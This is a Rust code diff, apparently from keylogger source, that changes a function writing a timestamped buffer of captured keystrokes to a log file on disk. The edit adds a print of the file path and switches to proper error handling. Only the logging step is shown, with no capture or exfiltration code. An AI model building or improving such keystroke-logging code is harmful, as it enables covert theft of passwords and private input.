@@ -48,11 +48,11 @@ fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()
         Err(_) => panic!("SystemTime before UNIX EPOCH!"),
     }
     println!("{}", format!("{}: {}", time_now, captured_keys_buffer));
+    println!("{}", log_file);
     let mut file = OpenOptions::new()
         .append(true)
         .create(true)
-        .open(log_file)
-        .unwrap();
+        .open(log_file)?;
     
     write!(file, "{}", format!("{}: {}\n", time_now, captured_keys_buffer))?;
     Ok(())
